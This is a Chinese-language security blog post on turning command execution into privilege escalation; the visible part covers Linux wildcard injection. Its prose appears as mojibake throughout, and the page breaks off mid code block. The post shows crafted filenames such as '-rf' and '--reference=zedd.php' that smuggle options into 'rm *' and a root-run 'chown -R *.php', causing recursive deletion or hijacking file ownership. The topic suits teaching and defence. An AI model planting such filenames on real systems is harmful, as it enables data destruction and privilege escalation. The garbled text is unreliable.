<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content=" \u200b\tæ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/4309\nä¹‹å‰åœ¨è¡¥å¤©å¹³å°é¦–å‘äº†å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼ï¼Œçœ‹åˆ°äº†æœ‰å‡ ä¸ªå¸ˆå‚…è¡ç”Ÿå‡ºäº†ä¸åŒçš„å‡ ä¸ªåç»­ç‰ˆæœ¬ï¼Œéƒ½æ„Ÿè§‰æŒºä¸é”™çš„ï¼Œå¯¹æˆ‘çš„ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›è¡¥å……ã€‚æœ¬æ¥è¿™ä¸ªæ€»ç»“åº”è¯¥ç®—æ˜¯å‰åŠéƒ¨åˆ†ï¼Œæƒ³å†™çš„è¿˜æ²¡å†™å®Œï¼Œå½“æ—¶åˆæ˜¯åœ¨è€ƒè¯•å‘¨ï¼ŒåŸæœ¬æƒ³åœ¨è€ƒè¯•ç»“æŸåå°±æ¥å†™ååŠéƒ¨åˆ†ï¼Œåˆå› ä¸ºå„ç§äº‹ç»™æ¨æ‰äº†ã€‚æ‰€ä»¥ç°åœ¨æ¥å†™ååŠéƒ¨åˆ†æå‡ç¯‡ï¼Œä¹Ÿç®—æ˜¯å¯¹å‰åŠéƒ¨åˆ†çš„è¡¥å……ä¸è§£é‡Šã€‚\n"><title>å‘½ä»¤æ‰§è¡Œåˆ°ææƒ</title>
<link rel=canonical href=https://zeddyu.github.io/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/><link rel=stylesheet href=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///scss/style.min.7c5ec07483cc4821866884bb5191c17c6429574614dfc6990b3635b9ca5bfa25.css integrity="sha256-fF7AdIPMSCGGaIS7UZHBfGQpV0YU38aZCzY1ucpb+iU=" crossorigin=anonymous><meta property='og:title' content="å‘½ä»¤æ‰§è¡Œåˆ°ææƒ"><meta property='og:description' content=" \u200b\tæ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/4309\nä¹‹å‰åœ¨è¡¥å¤©å¹³å°é¦–å‘äº†å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼ï¼Œçœ‹åˆ°äº†æœ‰å‡ ä¸ªå¸ˆå‚…è¡ç”Ÿå‡ºäº†ä¸åŒçš„å‡ ä¸ªåç»­ç‰ˆæœ¬ï¼Œéƒ½æ„Ÿè§‰æŒºä¸é”™çš„ï¼Œå¯¹æˆ‘çš„ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›è¡¥å……ã€‚æœ¬æ¥è¿™ä¸ªæ€»ç»“åº”è¯¥ç®—æ˜¯å‰åŠéƒ¨åˆ†ï¼Œæƒ³å†™çš„è¿˜æ²¡å†™å®Œï¼Œå½“æ—¶åˆæ˜¯åœ¨è€ƒè¯•å‘¨ï¼ŒåŸæœ¬æƒ³åœ¨è€ƒè¯•ç»“æŸåå°±æ¥å†™ååŠéƒ¨åˆ†ï¼Œåˆå› ä¸ºå„ç§äº‹ç»™æ¨æ‰äº†ã€‚æ‰€ä»¥ç°åœ¨æ¥å†™ååŠéƒ¨åˆ†æå‡ç¯‡ï¼Œä¹Ÿç®—æ˜¯å¯¹å‰åŠéƒ¨åˆ†çš„è¡¥å……ä¸è§£é‡Šã€‚\n"><meta property='og:url' content='https://zeddyu.github.io/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Sec'><meta property='article:tag' content='RCE'><meta property='article:published_time' content='2019-03-12T13:44:47+00:00'><meta property='article:modified_time' content='2019-03-12T13:44:47+00:00'><meta name=twitter:title content="å‘½ä»¤æ‰§è¡Œåˆ°ææƒ"><meta name=twitter:description content=" \u200b\tæ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/4309\nä¹‹å‰åœ¨è¡¥å¤©å¹³å°é¦–å‘äº†å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼ï¼Œçœ‹åˆ°äº†æœ‰å‡ ä¸ªå¸ˆå‚…è¡ç”Ÿå‡ºäº†ä¸åŒçš„å‡ ä¸ªåç»­ç‰ˆæœ¬ï¼Œéƒ½æ„Ÿè§‰æŒºä¸é”™çš„ï¼Œå¯¹æˆ‘çš„ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›è¡¥å……ã€‚æœ¬æ¥è¿™ä¸ªæ€»ç»“åº”è¯¥ç®—æ˜¯å‰åŠéƒ¨åˆ†ï¼Œæƒ³å†™çš„è¿˜æ²¡å†™å®Œï¼Œå½“æ—¶åˆæ˜¯åœ¨è€ƒè¯•å‘¨ï¼ŒåŸæœ¬æƒ³åœ¨è€ƒè¯•ç»“æŸåå°±æ¥å†™ååŠéƒ¨åˆ†ï¼Œåˆå› ä¸ºå„ç§äº‹ç»™æ¨æ‰äº†ã€‚æ‰€ä»¥ç°åœ¨æ¥å†™ååŠéƒ¨åˆ†æå‡ç¯‡ï¼Œä¹Ÿç®—æ˜¯å¯¹å‰åŠéƒ¨åˆ†çš„è¡¥å……ä¸è§£é‡Šã€‚\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zeddyu-lu.workers.dev/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io//img/avatar_hu6396534569623136415.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#ææƒ>ææƒ</a><ol><li><a href=#wildcard-wilderness>Wildcard Wilderness</a><ol><li><a href=#example-1>Example 1</a></li><li><a href=#example-2>Example 2</a></li></ol></li><li><a href=#trick>Trick</a><ol><li><a href=#file-owner-hijacking>File Owner Hijacking</a></li><li><a href=#chmod-file-reference>Chmod File Reference</a></li><li><a href=#tarå‘½ä»¤åˆ©ç”¨>Tarå‘½ä»¤åˆ©ç”¨</a></li><li><a href=#rsyncå‘½ä»¤åˆ©ç”¨>rsyncå‘½ä»¤åˆ©ç”¨</a></li><li><a href=#tips>Tips</a></li></ol></li><li><a href=#other>Other</a><ol><li><a href=#echo>Echo</a></li><li><a href=#ln>ln</a></li><li><a href=#shellshockcve-2014-6271>ShellShock(CVE-2014-6271)</a></li><li><a href=#ä»ä¸€é“é¢˜çœ‹shell-shock>ä»ä¸€é“é¢˜çœ‹Shell Shock</a></li></ol></li></ol></li><li><a href=#ä¸Šç¯‡çš„è§£é‡Šä¸è¡¥å……>ä¸Šç¯‡çš„è§£é‡Šä¸è¡¥å……</a><ol><li><a href=#ç‰¹æ®Šå˜é‡>ç‰¹æ®Šå˜é‡</a><ol><li><a href=#n>$n</a></li><li><a href=#ifs>$IFS</a></li><li><a href=#heading>$?</a></li><li><a href=#heading-1>$</a></li><li><a href=#heading-2>$#</a></li><li><a href=#ä¸>$*ä¸$@</a></li></ol></li><li><a href=#å†…ç½®å˜é‡ç»•è¿‡>å†…ç½®å˜é‡ç»•è¿‡</a><ol><li><a href=#bash>$BASH</a></li><li><a href=#home>$HOME</a></li><li><a href=#pwd>$PWD</a></li><li><a href=#oldpwd>$OLDPWD</a></li><li><a href=#path>$PATH</a></li><li><a href=#ps1>$PS1</a></li><li><a href=#ps2>$PS2</a></li><li><a href=#ps4>$PS4</a></li></ol></li><li><a href=#ä¸¾ä¸ª>ä¸¾ä¸ªğŸŒ°</a><ol><li><a href=#layer7-ctf-2018>Layer7 CTF 2018</a></li><li><a href=#é¢˜ç›®æè¿°>é¢˜ç›®æè¿°</a></li><li><a href=#writeup>WriteUp</a></li></ol></li></ol></li><li><a href=#å‚è€ƒ>å‚è€ƒï¼š</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/sec/ style=background-color:#0b0;color:#fff>Sec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/>å‘½ä»¤æ‰§è¡Œåˆ°ææƒ</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Mar 12, 2019</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>16 minute read</time></div><div class=article-readmore><a href=/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/>Read Moreâ€¦</a></div></footer></div></header><section class=article-content><blockquote><p>â€‹ æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/4309</p></blockquote><p>ä¹‹å‰åœ¨è¡¥å¤©å¹³å°é¦–å‘äº†<a class=link href=https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw target=_blank rel=noopener>å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼</a>ï¼Œçœ‹åˆ°äº†æœ‰å‡ ä¸ªå¸ˆå‚…è¡ç”Ÿå‡ºäº†ä¸åŒçš„å‡ ä¸ªåç»­ç‰ˆæœ¬ï¼Œéƒ½æ„Ÿè§‰æŒºä¸é”™çš„ï¼Œå¯¹æˆ‘çš„ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›è¡¥å……ã€‚æœ¬æ¥è¿™ä¸ªæ€»ç»“åº”è¯¥ç®—æ˜¯å‰åŠéƒ¨åˆ†ï¼Œæƒ³å†™çš„è¿˜æ²¡å†™å®Œï¼Œå½“æ—¶åˆæ˜¯åœ¨è€ƒè¯•å‘¨ï¼ŒåŸæœ¬æƒ³åœ¨è€ƒè¯•ç»“æŸåå°±æ¥å†™ååŠéƒ¨åˆ†ï¼Œåˆå› ä¸ºå„ç§äº‹ç»™æ¨æ‰äº†ã€‚æ‰€ä»¥ç°åœ¨æ¥å†™ååŠéƒ¨åˆ†æå‡ç¯‡ï¼Œä¹Ÿç®—æ˜¯å¯¹å‰åŠéƒ¨åˆ†çš„è¡¥å……ä¸è§£é‡Šã€‚</p><p>[TOC]</p><h2 id=ææƒ>ææƒ</h2><p>è¿™é‡Œæˆ‘ä»¬è®²è®²åœ¨å‘½ä»¤æ³¨å…¥ä¸­æ›´æœ‰æ„æ€çš„ä¸€ç§æ–¹æ³•ã€‚</p><h3 id=wildcard-wilderness>Wildcard Wilderness</h3><h4 id=example-1>Example 1</h4><p>é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªç¤ºä¾‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Hello Friends&#34;</span> &gt; file1
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;This is wildcard Injection&#34;</span> &gt;file2
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;take help&#34;</span> &gt; --help
</span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610004647.jpg loading=lazy></p><p>é¦–å…ˆåˆ›å»ºå‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯<code>--help</code>ï¼Œç„¶åä½¿ç”¨<code>cat</code>å‘½ä»¤è¯»å–æ–‡ä»¶å†…å®¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat file1
</span></span><span class=line><span class=cl>cat file <span class=m>2</span>
</span></span><span class=line><span class=cl>cat --help
</span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610007192.jpg loading=lazy></p><p>å¦‚æœæŒ‰ç…§æˆ‘ä»¬é¢„æœŸçš„ï¼Œæ˜¯ä¸æ˜¯åœ¨ç¬¬ä¸‰ä¸ª<code>cat --help</code>å¤„åº”è¯¥æ˜¯è¦è¯»å–<code>â€”help</code>æ–‡ä»¶çš„å†…å®¹å‘¢ï¼Ÿç„¶è€Œæˆ‘ä»¬æ‰§è¡Œ<code>cat â€”help</code>å´ä¼˜å…ˆæ‰§è¡Œäº†<code>cat</code>å‘½ä»¤çš„å¸®åŠ©é€‰é¡¹ï¼Œå¹¶æ²¡æœ‰è¯»å‡º<code>â€”help</code>é‡Œçš„å†…å®¹ã€‚</p><p>ä¸ä»…æ˜¯<code>cat</code>ï¼Œ<code>ls</code>ç­‰å‘½ä»¤ä¹Ÿä¼šä¼˜å…ˆè°ƒç”¨å†…ç½®<code>--help</code>é€‰é¡¹ã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610009843.jpg loading=lazy></p><p>ä»¥åŠè¿˜æœ‰<code>--all</code>é€‰é¡¹ã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610007699.jpg loading=lazy></p><p>å…¶å®è®²é“ç†ï¼Œè¯æ³•åˆ†ææŠŠå¯¹è¯¸å¦‚<code>--help</code>ã€<code>--all</code>ç­‰é€‰é¡¹ä¼˜å…ˆå¤„ç†ä¸ºå†…ç½®é€‰é¡¹è¾“å‡ºï¼Œçœ‹èµ·æ¥å¹¶æ²¡æœ‰ä»»ä½•é—®é¢˜</p><p>è¿™ä¸ªæŠ€å·§å«åš<code>Wildcard wildness</code>ï¼Œä¸­æ–‡æœ‰äººè¯‘ä¸ºé€šé…ç¬¦åœ¨é‡ã€‚(<code>-all</code>ã€<code>--help</code>å¯ä»¥é€šè¿‡åŠ å…¥<code>./</code>æˆ<code>./-all</code>ã€<code>./--help</code>æ¥ç‰¹æŒ‡è¿™ä¸ªæ–‡ä»¶ï¼Œé¿å…è¿™ä¸ªé—®é¢˜)</p><h4 id=example-2>Example 2</h4><p><img src=https://blogpic.zdy.one/img/20190610008865.jpg loading=lazy></p><p>å¦‚å›¾ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå½“ç”¨<code>rm *</code>çš„æ—¶å€™ï¼Œåªåˆ æ‰äº†<code>file1</code>ä¸<code>file2</code>ï¼Œå¹¶æ²¡æœ‰åˆ é™¤<code>*</code></p><p><img src=https://blogpic.zdy.one/img/20190610001503.jpg loading=lazy></p><p>æˆ–è€…ä½¿ç”¨<code>rm file1 file2 -rf</code>é€ä¸ªåˆ é™¤ä¹‹æ—¶ï¼Œä¹Ÿåªåˆ æ‰äº†<code>file1</code>ä¸<code>file2</code></p><p>ä½¿ç”¨<code>strace rm *</code>æˆ‘ä»¬å¯ä»¥å‘ç°</p><p><img src=https://blogpic.zdy.one/img/20190610005779.jpg loading=lazy></p><p>ç”±äºå½“å‰ç›®å½•ä¸­å­˜åœ¨<code>-rf</code>æ–‡ä»¶åï¼Œ<code>rm</code>å°†<code>-rf</code>é€‰é¡¹ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œå¹¶ä¸”é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚åŒæ ·ï¼Œè‹¥è¦åˆ é™¤å¯ä»¥åŠ ä¸Š<code>./-rf</code>è¿›è¡Œåˆ é™¤</p><h3 id=trick>Trick</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>Wildcard Wilderness</code>åšä¸€äº›æ›´æœ‰ç”¨çš„äº‹æƒ…ã€‚</p><h4 id=file-owner-hijacking>File Owner Hijacking</h4><p>ç°åœ¨æˆ‘ä»¬æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œä¸€ä¸ª<code>zedd</code>ï¼Œä¸€ä¸ª<code>test</code>ï¼Œä¸€ä¸ª<code>root</code>ç”¨æˆ·ã€‚</p><p>æˆ‘ä»¬åˆ†åˆ«ç”¨<code>zedd</code>ä¸<code>test</code>åˆ›å»ºäº†ä¸åŒçš„æ–‡ä»¶ï¼Œ<code>1.php</code>ä¸<code>test.php</code>éƒ½å±äº<code>test</code>ç”¨æˆ·çš„æ–‡ä»¶ï¼Œ<code>zedd.php</code>ä¸<code>--reference=zedd.php</code>å‡å±äº<code>zedd</code>ç”¨æˆ·çš„æ–‡ä»¶ã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610005137.jpg loading=lazy></p><p>ç„¶åä½¿ç”¨<code>root</code>ç”¨æˆ·ä½¿ç”¨<code>chown -R test:test *.php</code>å‘½ä»¤ï¼Œæƒ³æŠŠæœ¬ç›®å½•ä¸‹æ‰€æœ‰çš„<code>.php</code>æ–‡ä»¶ä¿®æ”¹ä¸º<code>test</code>ç”¨æˆ·æ‰€æœ‰ã€‚</p><p><img src=https://blogpic.zdy.one/img/20190610008433.jpg loading=lazy></p><p>ä½†æ˜¯ç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç»“æœè¯¥ç›®å½•ä¸‹æ‰€æœ‰çš„<code>.php</code>æ–‡ä»¶éƒ½è¢«ä¿®æ”¹ä¸ºäº†<code>zedd</code>ç”¨æˆ·æ‰€æœ‰ï¼ŒæˆåŠŸâ€œææƒâ€ã€‚</p><p>åŸç†æˆ‘ä»¬å¯ä»¥ç”¨<code>strace chown -R zedd:zedd *.php</code>æ¥çœ‹ä¸€ä¸‹ï¼ˆæ³¨æ„è¿™é‡Œæ¢äº†ä¸€ä¸‹ï¼Œæ¨¡æ‹Ÿæƒ³æŠŠ<code>.php</code>æ–‡ä»¶æ”¹å˜æˆ<code>zedd</code>ç”¨æˆ·æ‰€æœ‰ï¼‰</p><p><img src=https://blogpic.zdy.one/img/20190610009617.jpg loading=lazy></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
